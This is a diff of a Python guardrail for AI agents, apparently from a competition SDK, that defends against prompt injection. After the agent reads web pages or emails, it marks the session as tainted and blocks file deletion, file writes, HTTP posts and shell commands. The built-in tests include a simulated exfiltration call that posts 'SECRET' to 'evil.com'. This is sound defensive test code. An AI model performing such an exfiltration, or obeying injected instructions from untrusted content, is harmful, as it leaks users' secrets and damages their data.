@@ -1,21 +1,33 @@
-"""
-Simple Prompt Injection Guardrail
+"""Persistent-taint guardrail example for prompt-injection-style attacks."""
 
-Blocks tool calls that appear to be triggered by ACTION directives
-from untrusted sources (web pages, emails).
-"""
+from __future__ import annotations
 
-import re
+import sys
+from pathlib import Path
+
+
+def _repo_root() -> Path:
+    current = Path(__file__).resolve()
+    for parent in (current.parent, *current.parents):
+        if (parent / "aicomp_sdk").is_dir():
+            return parent
+    return current.parent
+
+
+_REPO_ROOT = _repo_root()
+if str(_REPO_ROOT) not in sys.path:
+    sys.path.insert(0, str(_REPO_ROOT))
 
 from aicomp_sdk.guardrails.base import Decision, GuardrailBase
 
 
 class Guardrail(GuardrailBase):
-    """Detects and blocks prompt injection attacks using persistent taint tracking"""
+    """Taint the session on untrusted content reads and block dangerous follow-on tools."""
 
-    def __init__(self):
+    def __init__(self) -> None:
         super().__init__()
         self.tainted = False
+        self.untrusted_content_tools = {"web.open", "email.read"}
         self.dangerous_operations = {
             "fs.delete",
             "fs.write",
@@ -25,16 +37,12 @@ class Guardrail(GuardrailBase):
         }
 
     def decide(self, tool_name, tool_args, context):
-        """Block dangerous operations after accessing untrusted sources"""
+        del tool_args, context
 
-        # Track when we access untrusted content
-        recent_sources = context.get("recent_sources", [])
-        if recent_sources and recent_sources[-1] in ["web", "email"]:
-            if tool_name in ["web.open", "email.read"]:
-                self.tainted = True
-                print(f"[PROMPT_INJECTION] Session tainted by {tool_name}")
+        if tool_name in self.untrusted_content_tools:
+            self.tainted = True
+            return Decision.allow("Tracked untrusted content access")
 
-        # If tainted, block all dangerous operations
         if self.tainted and tool_name in self.dangerous_operations:
             return Decision.deny(
                 f"Blocked {tool_name} after accessing untrusted content (prompt injection protection)"
@@ -44,50 +52,37 @@ class Guardrail(GuardrailBase):
 
 
 if __name__ == "__main__":
-    # Test the guardrail
     print("=" * 70)
     print("PROMPT INJECTION GUARDRAIL TESTS")
     print("=" * 70)
 
-    # Test 1: Normal operation without taint
-    print("\n[Test 1] fs.delete without taint:")
     guard = Guardrail()
     decision = guard.decide("fs.delete", {"path": "temp.txt"}, {"recent_sources": []})
-    print(f"  Result: {decision.action}")
+    print(f"\n[Test 1] fs.delete without taint: {decision.action}")
 
-    # Test 2: Access untrusted content, then dangerous op
-    print("\n[Test 2] web.open (taint), then fs.delete:")
     guard = Guardrail()
-    guard.decide("web.open", {"id": "demo"}, {"recent_sources": ["web"]})
+    guard.decide("web.open", {"id": "page_2"}, {"recent_sources": []})
     decision = guard.decide("fs.delete", {"path": "secret.txt"}, {"recent_sources": ["web"]})
-    print(f"  Result: {decision.action}")
+    print(f"[Test 2] web.open, then fs.delete: {decision.action}")
 
-    # Test 3: Read email, then http.post (exfiltration)
-    print("\n[Test 3] email.read (taint), then http.post:")
     guard = Guardrail()
-    guard.decide("email.read", {"id": "msg1"}, {"recent_sources": ["email"]})
+    guard.decide("email.read", {"id": "email_3"}, {"recent_sources": []})
     decision = guard.decide(
         "http.post",
         {"url": "evil.com", "data": "SECRET"},
         {"recent_sources": ["email"]},
     )
-    print(f"  Result: {decision.action}")
+    print(f"[Test 3] email.read, then http.post: {decision.action}")
 
-    # Test 4: Web search (no taint), then shell
-    print("\n[Test 4] web.search (no taint), then shell.run:")
     guard = Guardrail()
     guard.decide("web.search", {"query": "test"}, {"recent_sources": ["web"]})
     decision = guard.decide("shell.run", {"cmd": "echo test"}, {"recent_sources": ["web"]})
-    print(f"  Result: {decision.action}")
+    print(f"[Test 4] web.search only, then shell.run: {decision.action}")
 
-    # Test 5: Safe file operation after user command
-    print("\n[Test 5] fs.write from user (no web/email):")
     guard = Guardrail()
     decision = guard.decide(
-        "fs.write", {"path": "report.txt", "data": "test"}, {"recent_sources": ["user"]}
+        "fs.write",
+        {"path": "report.txt", "data": "test"},
+        {"recent_sources": ["user"]},
     )
-    print(f"  Result: {decision.action}")
-
-    print("\n" + "=" * 70)
-    print("TESTS COMPLETE")
-    print("=" * 70)
+    print(f"[Test 5] fs.write from user: {decision.action}")
